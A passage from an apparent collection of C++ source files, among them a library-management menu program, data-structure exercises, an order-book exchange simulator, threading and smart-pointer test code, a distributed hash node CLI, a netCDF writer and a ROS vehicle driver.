deleteBook(int id) {\r\n        int index = findBookIndexById(id);\r\n        if (index != -1) {\r\n            books.erase(books.begin() + index);\r\n            cout << \"Book deleted.\" << endl;\r\n        } else {\r\n            cout << \"Book not found.\" << endl;\r\n        }\r\n    }\r\n\r\n    void displayBookDetails(const Book& book) {\r\n        cout << \"ID: \" << book.id << \", Title: \" << book.title\r\n             << \", Author: \" << book.author\r\n             << \", Status: \" << (book.isIssued ? \"Issued\" : \"Available\") << endl;\r\n    }\r\n};\r\nint main() {\r\n    Library lib;\r\n    int choice, id;\r\n    string title, author, student;\r\n\r\n    do {\r\n        cout << \"\\nLibrary Management System\\n\";\r\n        cout << \"1. Add Book\\n\";\r\n        cout << \"2. Search Book by ID\\n\";\r\n        cout << \"3. Search Book by Title\\n\";\r\n        cout << \"4. Issue Book\\n\";\r\n        cout << \"5. Return Book\\n\";\r\n        cout << \"6. List All Books\\n\";\r\n        cout << \"7. Delete Book\\n\";\r\n        cout << \"8. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                cout << \"Enter book ID: \";\r\n                cin >> id;\r\n                cin.ignore();\r\n                cout << \"Enter book title: \";\r\n                getline(cin, title);\r\n                cout << \"Enter book author: \";\r\n                getline(cin, author);\r\n                lib.addBook(id, title, author);\r\n                break;\r\n            case 2:\r\n                cout << \"Enter book ID: \";\r\n                cin >> id;\r\n                lib.searchBookById(id);\r\n                break;\r\n            case 3:\r\n                cin.ignore();\r\n                cout << \"Enter book title: \";\r\n                getline(cin, title);\r\n                lib.searchBookByTitle(title);\r\n                break;\r\n            case 4:\r\n                cout << \"Enter book ID: \";\r\n                cin >> id;\r\n                cin.ignore();\r\n                cout << \"Enter student name: \";\r\n                getline(cin, student);\r\n                lib.issueBook(id, student);\r\n                break;\r\n            case 5:\r\n                cout << \"Enter book ID: \";\r\n                cin >> id;\r\n                lib.returnBook(id);\r\n                break;\r\n            case 6:\r\n                lib.listAllBooks();\r\n                break;\r\n            case 7:\r\n                cout << \"Enter book ID: \";\r\n                cin >> id;\r\n                lib.deleteBook(id);\r\n                break;\r\n            case 8:\r\n                cout << \"Exiting system.\" << endl;\r\n                break;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\" << endl;\r\n        }\r\n    } while (choice != 8);\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\n\nusing namespace std;\n\n\nclass tree{\n    struct node{\n        int value;\n        node* left;\n        node* right;\n\n        node(int Value) : value(Value), left(nullptr), right(nullptr) {}\n    };\n    node* root;\n\npublic:\n    tree() : root(nullptr) {}\n\n    void append(int);\n    void insert(node*& , node*& );\n    string search(int);\n    void display();\n    void printTree(node*);\n};\n\n\nint main(){\n    tree numbers;\n\n    numbers.append(10);\n    numbers.append(20);\n    numbers.append(5);\n\n    numbers.display();\n\n    cout << numbers.search(20);\n\n    return 0;\n}\n\nvoid tree::append(int Value){\n    node* newNode = new node(Value);\n    if (!root){root = newNode;}\n    else{\n        node* temp = root;\n        insert(temp, newNode);\n    }\n}\n\nvoid tree::insert(node*& temp, node*& newNode) {\n    if (temp == nullptr){temp = newNode;}                 \n    else if (newNode->value < temp->value) {insert(temp->left, newNode);}    \n    else {insert(temp->right, newNode);}\n}\n\nstring tree::search(int value) {\n    node* temp = root;\n    while (temp != nullptr) {\n        if (value == temp->value) {return \"Found\";} \n        else if (value < temp->value) {temp = temp->left;} \n        else {temp = temp->right;}\n    }\n    return \"Not Found\";\n}\nvoid tree::display(){\n    if (!root) {cout << \"Tree is empty.\" << endl;}\n    else{\n        printTree(root);\n        cout << endl;\n    }\n}    \nvoid tree::printTree(node* temp){\n    if (temp){\n        cout << temp->value << \" \";\n        printTree(temp->left);       \n        printTree(temp->right);\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"color_screen_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n\nstruct node{\n    int sum, maxm, lazy;\n\n    node(){\n        sum = 0;\n        maxm = 0;\n        lazy = 0;\n    }\n};\n\nint n;\nvector<int> arr;\nvector<node> tree(404040);\n\nnode merge(node a, node b){\n    node temp;\n    temp.sum = a.sum + b.sum;\n    temp.maxm = max(a.maxm, b.maxm);\n    return temp;\n}\n\nvoid push(int index, int l, int r){\n    if(tree[index].lazy){\n        tree[index].sum = (r-l+1)*tree[index].lazy;\n        tree[index].maxm = tree[index].lazy;\n        if(l!=r){\n            tree[2*index].lazy = tree[index].lazy;\n            tree[2*index+1].lazy = tree[index].lazy;\n        }\n        tree[index].lazy = 0;\n    }\n}\n\nvoid update(int index, int l, int r, int lq, int rq, int v){\n    push(index, l, r);\n    if(lq>r || rq<l){\n        return;\n    }\n\n    if(lq<=l && rq>=r){\n        tree[index].lazy = v;\n        push(index, l, r);\n        return;\n    }\n\n    int mid = (l+r)/2;\n    update(2*index, l, mid, lq, rq, v);\n    update(2*index+1, mid+1, r, lq, rq, v);\n    tree[index] = merge(tree[2*index], tree[2*index+1]);\n}\n\nnode query(int index, int l, int r, int lq, int rq){\n    push(index, l, r);\n    if(lq>r || rq<l){\n        return node();\n    }\n\n    if(lq<=l && rq>=r){\n        return tree[index];\n    }\n\n    int mid = (l+r)/2;\n    return merge(query(2*index, l, mid, lq, rq), query(2*index+1, mid+1, r, lq, rq));\n}\n\nvoid solve(){\n    update(1, 0, 9, 0, 5, 3);\n    update(1, 0, 9, 6, 9, 4);\n    node x = query(1, 0, 9, 3, 6);\n    cout<<x.sum<<\" \"<<x.maxm<<endl;\n}\n\nsigned main(){\n    solve();\n    return 0;\n}",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n#include <algorithm>\n#include <ctime>\n\n// Order class\nclass Order {\npublic:\n    std::string orderId;\n    std::string clientOrderId;\n    std::string instrument;\n    int side;\n    int quantity;\n    double price;\n    int sequenceNumber; // Sequence number to track order insertion\n\n    Order(const std::string& orderId, const std::string& clientOrderId, const std::string& instrument,\n        int side, int quantity, double price, int sequenceNumber)\n        : orderId(orderId), clientOrderId(clientOrderId), instrument(instrument),\n        side(side), quantity(quantity), price(price), sequenceNumber(sequenceNumber) {}\n};\n\n// OrderBook class\nclass OrderBook {\nprivate:\n    std::string instrument;\n    std::vector<Order> buyOrders;\n    std::vector<Order> sellOrders;\n\npublic:\n    OrderBook() = default;\n\n    OrderBook(const std::string& instrumentName) : instrument(instrumentName) {}\n\n    void addOrder(const Order& order) {\n        if (order.side == 1) { // Buy side\n            buyOrders.push_back(order);\n            std::sort(buyOrders.begin(), buyOrders.end(), [](const Order& a, const Order& b) {\n                return (a.price < b.price) || (a.price == b.price && a.sequenceNumber < b.sequenceNumber);\n                });\n        }\n        else { // Sell side\n            sellOrders.push_back(order);\n            std::sort(sellOrders.begin(), sellOrders.end(), [](const Order& a, const Order& b) {\n                return (a.price > b.price) || (a.price == b.price && a.sequenceNumber < b.sequenceNumber);\n                });\n        }\n    }\n\n    std::vector<Order>& getBuyOrders() { return buyOrders; }\n    std::vector<Order>& getSellOrders() { return sellOrders; }\n};\n\n// ExecutionReport class\nclass ExecutionReport {\npublic:\n    static void generateReport(const std::string& orderId, const std::string& clientOrderId, const std::string& instrument,\n        int side, const std::string& executionStatus, int quantity, double price) {\n        std::ofstream file(\"Execution_Rep.csv\", std::ios::app);\n        if (file.is_open()) {\n            file << orderId << \",\" << clientOrderId << \",\" << instrument << \",\" << side << \",\"\n                << executionStatus << \",\" << quantity << \",\" << price << \"\\n\";\n            file.close();\n        }\n        else {\n            std::cerr << \"Error: Unable to open Execution_Rep.csv for writing.\" << std::endl;\n        }\n    }\n};\n\n// Exchange class\nclass Exchange {\nprivate:\n    std::unordered_map<std::string, OrderBook> orderBooks;\n    int orderIdCounter = 1;       // To generate unique Order IDs (ord1, ord2, ...)\n    int sequenceCounter = 1;      // Sequence counter for orders\n\npublic:\n    Exchange() {\n        orderBooks.emplace(\"Rose\", OrderBook(\"Rose\"));\n        orderBooks.emplace(\"Lavender\", OrderBook(\"Lavender\"));\n        orderBooks.emplace(\"Lotus\", OrderBook(\"Lotus\"));\n        orderBooks.emplace(\"Tulip\", OrderBook(\"Tulip\"));\n        orderBooks.emplace(\"Orchid\", OrderBook(\"Orchid\"));\n    }\n\n    void processCSV(const std::string& filePath) {\n        std::ifstream file(filePath);\n        std::string line;\n\n        if (!file.is_open()) {\n            std::cerr << \"Error opening file: \" << filePath << std::endl;\n            return;\n        }\n\n        while (std::getline(file, line)) {\n            std::istringstream ss(line);\n            std::string clientOrderId, instrument, sideStr, quantityStr, priceStr;\n            int side, quantity;\n            double price;\n\n            // Extract values based on commas\n            std::getline(ss, clientOrderId, ',');\n            std::getline(ss, instrument, ',');\n            std::getline(ss, sideStr, ',');\n            std::getline(ss, quantityStr, ',');\n            std::getline(ss, priceStr, ',');\n\n            // Convert extracted strings to proper types\n            side = std::stoi(sideStr);\n            quantity = std::stoi(quantityStr);\n            price = std::stod(priceStr);\n\n            std::string orderId = \"ord\" + std::to_string(orderIdCounter++);\n\n            // Create a new order with a sequence number\n            Order order(orderId, clientOrderId, instrument, side, quantity, price, sequenceCounter++);\n\n            // Check for immediate match before adding as a \"New\" order\n            bool matched = checkAndExecuteTrades(orderBooks[instrument], order, instrument);\n\n            // If no immediate match is found, add as a new order\n            if (!matched) {\n                orderBooks[instrument].addOrder(order);\n                ExecutionReport::generateReport(orderId, clientOrderId, instrument, side, \"New\", quantity, price);\n            }\n        }\n\n        file.close();\n    }\n\n    bool checkAndExecuteTrades(OrderBook& orderBook, Order& newOrder, const std::string& instrument) {\n        auto& buyOrders = orderBook.getBuyOrders();\n        auto& sellOrders = orderBook.getSellOrders();\n        bool tradeExecuted = false;\n\n        // Check ",
    "#include \"cv_based_threading.h\"\n\n#include <condition_variable>\n#include <format>\n#include <iostream>\n#include <mutex>\n#include <random>\n\nnamespace\n{\nstd::default_random_engine\n    g_generator(  // NOLINT(cppcoreguidelines-avoid-non-const-global-variables)\n        std::random_device{}());\nstd::uniform_int_distribution<int>\n    g_distribution;  // NOLINT(cppcoreguidelines-avoid-non-const-global-variables)\n\nstd::mutex g_producerMtx;      // NOLINT(cppcoreguidelines-avoid-non-const-global-variables)\nstd::condition_variable g_cv;  // NOLINT(cppcoreguidelines-avoid-non-const-global-variables)\n\nstd::atomic_int g_order = 1;  // NOLINT(cppcoreguidelines-avoid-non-const-global-variables)\nlong long g_startTime;        // NOLINT(cppcoreguidelines-avoid-non-const-global-variables)\n\n[[nodiscard]] long long getCurrentTimeInMicroseconds()\n{\n    return std::chrono::duration_cast<std::chrono::microseconds>(\n               std::chrono::high_resolution_clock::now().time_since_epoch())\n        .count();\n}\n}  // namespace\n\nvoid initializeDistribution(int to)\n{\n    g_distribution = std::uniform_int_distribution<int>(1, to);\n}\n\nvoid initializeStartTime()\n{\n    g_startTime = getCurrentTimeInMicroseconds();\n}\n\nvoid produce(core::ThreadSafeQueue<int>& queue, int elements, std::atomic_bool& completed)\n{\n    while (!completed.load())\n    {\n        if (!queue.tryPush(g_distribution(g_generator)))\n        {\n            // The producer thread will wait on the CV until one of the consumers signals that space\n            // has been freed in the queue, allowing the producer to continue producing items\n            // safely.\n            std::unique_lock<std::mutex> lock(g_producerMtx);\n            g_cv.wait(lock);\n        }\n    }\n    std::cout << \"CV-based producer finished task.\\n\";\n}\n\nvoid consume(core::ThreadSafeQueue<int>& queue,\n             std::vector<NumberInfo>& storage,\n             int elements,\n             std::atomic_bool& completed)\n{\n    int randValue{};\n    while (!completed.load())\n    {\n        if (queue.tryPop(randValue))\n        {\n            int index = randValue - 1;\n            size_t expected = 0;\n            // Check if the generated number is already present in the storage. Do it in a\n            // thread-safe manner using the atomic operation compare_exchange_strong.\n            if (storage[index].m_order.compare_exchange_strong(expected, g_order))\n            {\n                // Calculate time it took to generate the value\n                auto endTime = getCurrentTimeInMicroseconds();\n                auto timeTaken = endTime - g_startTime;\n\n                // Save the generated number\n                storage[index].m_order = g_order++;\n                storage[index].m_generationTime = timeTaken;\n\n                std::cout << std::format(\n                    \"number = {:05}, order = {:05}, generation_time = {:010}\\n\", randValue,\n                    storage[index].m_order.load(), timeTaken);\n\n                if (g_order == elements + 1)\n                {\n                    // All the numbers are generated\n                    completed.store(true);\n                    g_cv.notify_all();\n                    break;\n                }\n\n                g_startTime = getCurrentTimeInMicroseconds();\n            }\n            g_cv.notify_one();\n        }\n    }\n    std::cout << \"CV-based consumer finished task.\\n\";\n}",
    "//\n// Created by wxk on 2024/10/14.\n//\n#include \"SmartPtr.hpp\"\n#include <catch2/catch_test_macros.hpp>\n\nstruct MyClass {\n    int a,b,c;\n};\n\nstruct Student:EnableSharedFromThis<Student> {\n    const char *name_;\n    int age_;\n    explicit Student(const char *name,int age):name_(name),age_(age) {\n\n    }\n    void func() {\n        std::cout << (void *)shared_from_this().get()<<std::endl;\n        //global(sp);\n    }\n    Student(Student &&)=delete;\n    ~Student() {\n        puts(\"Student destructor\");\n    }\n};\nstruct StudentDerived: Student {\n    explicit StudentDerived(const char *name,int age):Student(name,age) {\n        puts(\"StudentDerived destructor\");\n    }\n    ~StudentDerived() {\n        puts(\"StudentDerived destructor\");\n    }\n};\n\nTEST_CASE(\"Constructor that receive a pointer\",\"[UniquePtr]\") {\n    // \u6700\u597d\u662f\u8bbe\u7f6e\u6210\u7edd\u5bf9\u8def\u5f84\n    auto p = UniquePtr<FILE, FileDeleter>(fopen(\"a.txt\",\"r\"));\n    CHECK(p.get()!=nullptr);\n}\n\nTEST_CASE(\"Constructor that receive a new array\",\"[UniquePtr]\") {\n    auto p = UniquePtr<int[]>(new int[2]);\n    CHECK(p.get()!=nullptr);\n}\nTEST_CASE(\"get member funciton \",\"[UniquePtr]\") {\n    auto arr = UniquePtr<int[]>(new int[2]);\n    arr.get()[0] = 1;\n    REQUIRE(arr.get()[0] == 1);\n}\n\nTEST_CASE(\"makeUnique fun\",\"[UniquePtr]\") {\n    auto p = makeUnique<MyClass>(41,42,43);\n    CHECK(p->a == 41);\n    CHECK(p->b == 42);\n    CHECK(p->c == 43);\n}\n\nTEST_CASE(\"makeUniqueForOverWrite fun\",\"[UniquePtr]\") {\n    auto p2 = makeUniqueForOverWrite<int>();\n    CHECK(p2.get()!=nullptr);\n}\n\nTEST_CASE(\"polymorphic\",\"[UniquePtr]\") {\n    std::vector<UniquePtr<Animal>> vec;\n    vec.push_back(makeUnique<Cat>());\n    vec.push_back(makeUnique<Dog>());\n    for(auto const& animal:vec) {\n        animal->speak();\n    }\n}\n\nTEST_CASE(\"makeShared and enable_shared_from_this\",\"[SharePtr]\") {\n    SharedPtr<Student> sp1 = makeShared<Student>(\"wxk\",23);\n    SharedPtr<Student> sp2(new Student(\"wxk\",23));\n    sp2->func();\n    sp1->func();\n}\n\nTEST_CASE(\"Constructor that receive a pointer\",\"[SharedPtr]\") {\n    SharedPtr<Student> sp(new StudentDerived(\"wxk\",23));\n    REQUIRE(sp.get()!=nullptr);\n}\n\nTEST_CASE(\"implicit conversion\",\"[SharedPtr]\") {\n    SharedPtr<Student> sp3(new StudentDerived(\"wxk\",23));\n    SharedPtr<Student const> sp5 = sp3;\n    REQUIRE(sp3->age_ == sp5->age_);\n    REQUIRE(sp3->name_ == sp5->name_);\n}\n\nTEST_CASE(\"explicit translation\",\"[SharedPtr]\") {\n    SharedPtr<Student> sp3(new StudentDerived(\"wxk\",23));\n    SharedPtr<Student const> sp5 = sp3;\n    auto sp4 = staticPointerCast<StudentDerived>(sp3);\n    REQUIRE(sp4->name_ == \"wxk\");\n    REQUIRE(sp4->age_ == 23);\n    sp3 = constPointerCast<Student>(sp5);\n    REQUIRE(sp3->name_ == \"wxk\");\n    REQUIRE(sp3->age_ == 23);\n}\n\n/*\nint main() {\n\n\n    // \u652f\u6301 shared_ptr\n    SharedPtr<Student> sp1 = makeShared<Student>(\"wxk\",23);\n    SharedPtr<Student> sp2(new Student(\"wxk\",23));\n    sp2->func();\n    sp1->func();\n\n    SharedPtr<Student> sp3(new StudentDerived(\"wxk\",23));\n    auto sp4 = staticPointerCast<StudentDerived>(sp3);\n    SharedPtr<Student const> sp5 = sp3;\n    //sp3 = sp5;\n    sp3 = constPointerCast<Student>(sp5);\n\n    return 0;\n}\n*/",
    "#include <iostream>\n#include <vector>\n#include <cstdlib>\n#include <cstring>\n#include <thread>\n\n#include \"init.h\"\n#include \"port.h\"\n#include \"functions.h\"\n#include \"helperClass.h\"\n#include \"nodeInformation.h\"\n\nusing namespace std;\n\nvoid initialize(){\n\t\n\tNodeInformation nodeInfo = NodeInformation();\n\n\t/* open a socket to listen to other nodes */\n\tnodeInfo.sp.specifyPortServer();\n\n\tcout<<\"Now listening at port number \"<<nodeInfo.sp.getPortNumber()<<endl;\n\n\tcout<<\"Type help to know more\\n\";\n\n\tstring command;\n\n\twhile(1){\n\t\tcout<<\"> \";\n\t\tgetline(cin,command);\n\n\t\t/* find space in command and seperate arguments*/\n\t\tHelperFunctions help = HelperFunctions();\n\t\tvector<string> arguments = help.splitCommand(command);\n\n\t\tstring arg = arguments[0];\n\t\tif(arguments.size() == 1){\n\n\t\t\t/* creates */\n\t\t\tif(arg == \"create\"){\n\t\t\t\tif(nodeInfo.getStatus() == true){\n\t\t\t\t\tcout<<\"Sorry but this node is already on the ring\\n\";\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\tthread first(create,ref(nodeInfo));\n\t\t\t\t\tfirst.detach();\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t/* prints */\n\t\t\telse if(arg == \"printstate\"){\n\t\t\t\tif(nodeInfo.getStatus() == false){\n\t\t\t\t\tcout<<\"Sorry this node is not in the ring\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tprintState(nodeInfo);\n\t\t\t}\n\n\t\t\t/* leaves */\n\t\t\telse if(arg == \"leave\"){\n\t\t\t\tleave(nodeInfo);\n\t\t\t\tnodeInfo.sp.closeSocket();\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\t/* print current port number */\n\t\t\telse if(arg == \"port\"){\n\t\t\t\tcout<<nodeInfo.sp.getPortNumber()<<endl;\n\t\t\t}\n\n\t\t\t/* print keys present in this node */\n\t\t\telse if(arg == \"print\"){\n\t\t\t\tif(nodeInfo.getStatus() == false){\n\t\t\t\t\tcout<<\"Sorry this node is not in the ring\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tnodeInfo.printKeys();\n\t\t\t}\n\n\t\t\telse if(arg == \"help\"){\n\t\t\t\tshowHelp();\n\t\t\t}\n\n\t\t\telse{\n\t\t\t\tcout<<\"Invalid Command\\n\";\n\t\t\t}\n\t\t}\n\n\t\telse if(arguments.size() == 2){\n\n\t\t\t/* */\n\t\t\tif(arg == \"port\"){\n\t\t\t\tif(nodeInfo.getStatus() == true){\n\t\t\t\t\tcout<<\"Sorry you can't change port number now\\n\";\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\tint newPortNo = atoi(arguments[1].c_str());\n\t\t\t\t\tnodeInfo.sp.changePortNumber(newPortNo);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t/* */\n\t\t\telse if(arg == \"get\"){\n\t\t\t\tif(nodeInfo.getStatus() == false){\n\t\t\t\t\tcout<<\"Sorry this node is not in the ring\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tget(arguments[1],nodeInfo);\n\t\t\t}\n\n\t\t\telse{\n\t\t\t\tcout<<\"Invalid Command\\n\";\n\t\t\t}\n\t\t}\n\n\t\telse if(arguments.size() == 3){\n\n\t\t\t/* */\n\t\t\tif(arg == \"join\"){\n\t\t\t\tif(nodeInfo.getStatus() == true){\n\t\t\t\t\tcout<<\"Sorry but this node is already on the ring\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tjoin(nodeInfo,arguments[1],arguments[2]);\n\t\t\t}\n\n\t\t\t/* puts the entered key and it's value to the necessary node*/\n\t\t\telse if(arg == \"put\"){\n\t\t\t\tif(nodeInfo.getStatus() == false){\n\t\t\t\t\tcout<<\"Sorry this node is not in the ring\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tput(arguments[1],arguments[2],nodeInfo);\n\t\t\t}\n\n\t\t\telse{\n\t\t\t\tcout<<\"Invalid Command\\n\";\n\t\t\t}\n\t\t}\n\n\t\telse{\n\t\t\tcout<<\"Invalid Command\\n\";\n\t\t}\n\t}\n\t\n}",
    "#include <random>\n#include <netcdf.h>\n#include <zlib.h>\n#include <chrono>\n\n#include \"ChunkDataWriter.h\"\n#include \"IndexManager.h\"\n#include \"MetaCache.h\"\n#include \"VarCompress.h\"\n#include \"config.h\"\n\nusing namespace raster;\nusing namespace std::chrono;\nstatic std::default_random_engine random_engine(time(0));\n\ntemplate <typename T>\nstatic void memcpy_chk2d(T* dest, const T* src, size_t* start, size_t* varshape, size_t* chkshape)\n{\n    if (start[0] + chkshape[0] > varshape[0] || start[1] + chkshape[1] > varshape[1])\n        throw std::runtime_error(\"Memcpy_chk2d - Error: index out of range\");\n\n    for (size_t i = 0; i < chkshape[0]; i++)\n        memcpy(dest + i * chkshape[1], src + (i + start[0]) * varshape[1] + start[1], sizeof(T) * chkshape[1]);\n}\n\ntemplate <typename T>\nstatic void memcpy_chk3d(T* dest, const T* src, size_t* start, size_t* varshape, size_t* chkshape)\n{\n    if (start[0] + chkshape[0] > varshape[0])\n        throw std::runtime_error(\"Memcpy_chk3d - Error: index out of range\");\n\n    for (size_t layer = 0; layer < chkshape[0]; layer++)\n    {\n        memcpy_chk2d<T>(dest + layer * chkshape[1] * chkshape[2], src + layer * varshape[1] * varshape[2], \n                        start + 1, varshape + 1, chkshape + 1);\n    }\n}\n\ntemplate <typename T>\nstatic void memcpy_chk4d(T* dest, const T* src, size_t* start, size_t* varshape, size_t* chkshape)\n{\n    if (start[0] + chkshape[0] > varshape[0])\n        throw std::runtime_error(\"Memcpy_chk4d - Error: index out of range\");\n\n    for (size_t layer = 0; layer < chkshape[0]; layer++)\n    {\n        memcpy_chk3d<T>(dest + layer * chkshape[1] * chkshape[2] * chkshape[3], src + layer * varshape[1] * varshape[2] * varshape[3], \n                        start + 1, varshape + 1, chkshape + 1);\n    }\n}\n\ntemplate <typename T>\nstatic int do_write_region(int maskid, uint64_t* region_meta, int meta_rows, int meta_cols,\n                               const T* data, size_t* data_shape, int var_grp_id, int* dimids, int var_type)\n{\n    int ndims = (meta_cols - 1) / 2, status = NC_NOERR, region_grp_id;\n    int normal_height = data_shape[ndims - 2] / CHUNKSIZE_NX;\n    std::string region_name = \"region_\" + std::to_string(maskid);\n    assert(meta_rows >= 1);\n    status = nc_def_grp(var_grp_id, region_name.c_str(), &region_grp_id);\n    std::vector<T*> chunk_ptrs(meta_rows); // save pointers to each chunk\n    std::vector<int> chunk_ids(meta_rows); // save chunk variable ids\n\n    // Pass 1: memory copy + variable definition\n    for (int i = 0; i < meta_rows; i++)\n    {\n        size_t* start = &region_meta[i * meta_cols + 1];\n        size_t* count = &region_meta[i * meta_cols + 1 + ndims];\n        size_t chunksize = std::accumulate(&count[0], &count[ndims], 1, [&](size_t a, size_t b){ return a * b; } );\n        int varsize_dimid, old_dimid;\n        char buffer[128];\n\n        chunk_ptrs[i] = new T[chunksize];\n        sprintf(buffer, \"_chunk_%d_size_\", (int)region_meta[i * meta_cols]);\n        status = nc_def_dim(region_grp_id, buffer, chunksize * sizeof(T), &varsize_dimid);\n        status = sprintf(buffer, \"chunk_%d\", (int)region_meta[i * meta_cols]);\n        status = nc_def_var(region_grp_id, buffer, NC_UBYTE, 1, &varsize_dimid, &chunk_ids[i]);\n    }\n\n    // pass 2: do memory copy in parallel\n    // #pragma omp parallel for\n    for (int i = 0; i < meta_rows; i++)\n    {\n        switch (ndims)\n        {\n            case 2: memcpy_chk2d<T>(chunk_ptrs[i], data, &region_meta[i * meta_cols + 1], data_shape, \n                                    &region_meta[i * meta_cols + 1 + ndims]); break;\n            case 3: memcpy_chk3d<T>(chunk_ptrs[i], data, &region_meta[i * meta_cols + 1], data_shape, \n                                    &region_meta[i * meta_cols + 1 + ndims]); break;\n            case 4: memcpy_chk4d<T>(chunk_ptrs[i], data, &region_meta[i * meta_cols + 1], data_shape, \n                                    &region_meta[i * meta_cols + 1 + ndims]); break;\n            default: throw std::runtime_error(\"Unsupported dimension: \" + std::to_string(ndims));\n        }\n    }\n\n    // Ziplevel detection, our algorithm will compress those regions with a high compress ratio\n    // which indicates that region has a high probability to be a invalid region (at least it\n    // has a low information entropy)\n    int zlevel = 0;\n    float avg_ratio = 1;\n    std::uniform_int_distribution<unsigned> unif(0, meta_rows - 1);\n    for (int i = 0; i < ZIP_DETECT_NSAMPLES; i++)\n    {\n        // select a sample chunk from chunks randomly\n        T* sample_ptr = chunk_ptrs[unif(random_engine)];\n        // TODO\n    }\n    if (avg_ratio < 0.05)       // [0, 0.05)\n        zlevel = ZLEVEL_HIGH;\n    else if (avg_ratio < 0.1)   // [0.05, 0.1)\n        zlevel = ZLEVEL_MID;\n    else if (avg_ratio < 0.2)   // [0.1, 0.2)\n        zlevel = ZLEVEL_LOW;\n    else                        // [0.2, 1]\n        zlevel = ZLEVEL_NOZIP;\n\n    // Pass 3: write data according to detected zip level\n    for (int i = 0; i < meta_rows; i++)\n    {\n",
    "\ufeff#include <vehicle_func.h>\nusing namespace XROS_VEHICLE;\n\n#define DEV_NODE_NAME \"xnode_vehicle\"\n#define DEV_CLASS 1\n\nVehicleFunc::VehicleFunc()\n{\n    f_online = false;\n    f_enable = false;\n    f_mode = false;\n    f_new_vel = false;\n    f_ready = false;\n    m_online_count = 200;\n}\n/*------------------------------------------------------------------------------------------------------------------\n * name: GetInterface\n -----------------------------------------------------------------------------------------------------------------*/\nVehicleFunc& VehicleFunc::GetVehicleFunc()\n{\n    static VehicleFunc vehicle_func;\n    return vehicle_func;\n}\n/*------------------------------------------------------------------------------------------------------------------\n * name: BaseInit\n -----------------------------------------------------------------------------------------------------------------*/\nvoid VehicleFunc::BaseInit(void)\n{    \n    ROSInterface& ros_interface = ROSInterface::GetInterface();\n    LibFileIni& lib_file_ini = LibFileIni::GetLibFileIni();\n    f_ready = false;\n    if(f_online && f_enable && f_mode)\n    {\n        if(lib_file_ini.GetKeyValue(lib_file_ini.ToHexStr(m_dev_info.s_type).c_str(),\"type\").size() == 0)\n        {\n            ros_interface.ROSLog(LogLevel::kWarn,\" %s: Unknown type of vehicle,please update ini file. \\033[0m\",DEV_NODE_NAME);\n            ros_interface.ROSLog(LogLevel::kError,\" %s: System will shutdown!! \\033[0m\",DEV_NODE_NAME);\n            ros_interface.Shutdown();\n        }\n        ros_interface.ROSLog(LogLevel::kInfo,\"\\033[1;34m %s: Device type = %s \\033[0m\",DEV_NODE_NAME,\n                             lib_file_ini.GetKeyValue(lib_file_ini.ToHexStr(m_dev_info.s_type).c_str(),\"type\").c_str());\n        ros_interface.ROSLog(LogLevel::kInfo,\"\\033[1;32m %s: ### Vehicle init finish ### \\033[0m\",DEV_NODE_NAME);\n        DevZero();\n        usleep(500000);\n        f_ready = true;\n    }\n}\n/*------------------------------------------------------------------------------------------------------------------\n * name: OnlineCheck\n -----------------------------------------------------------------------------------------------------------------*/\n#define ONLINE_INIT 0\n#define ONLINE 1\n#define OFFINE 2\nvoid VehicleFunc::OnlineCheck()\n{\n    ROSInterface& ros_interface = ROSInterface::GetInterface();\n    LibFileIni& lib_file_ini = LibFileIni::GetLibFileIni();\n    std::string model;\n    static char online_state = ONLINE_INIT;\n    if(m_online_count == 0)f_online = false;    \n    else m_online_count--;\n    switch(online_state)\n    {\n    case ONLINE_INIT:\n        if(m_online_count == 1)\n        {\n            online_state = OFFINE;\n            ros_interface.ROSLog(LogLevel::kError,\" %s: Vehicle offline,please check cable connection\",DEV_NODE_NAME);\n        }\n        if(f_online)\n        {\n            online_state = ONLINE;\n            ros_interface.ROSLog(LogLevel::kInfo,\"\\033[1;32m %s: Vehicle online \\033[0m\",DEV_NODE_NAME);\n            model = lib_file_ini.GetKeyValue(lib_file_ini.ToHexStr(m_dev_info.s_type).c_str(),\"model\");\n            if(model.compare(\"Ackermann\")==0)m_dev_info.s_rotate_mode = 1;\n        }\n        break;\n    case OFFINE:\n        if(f_online)\n        {\n            ros_interface.ROSLog(LogLevel::kInfo,\"\\033[1;32m %s: Vehicle online \\033[0m\",DEV_NODE_NAME);\n            online_state = ONLINE;\n        }\n        break;\n    case 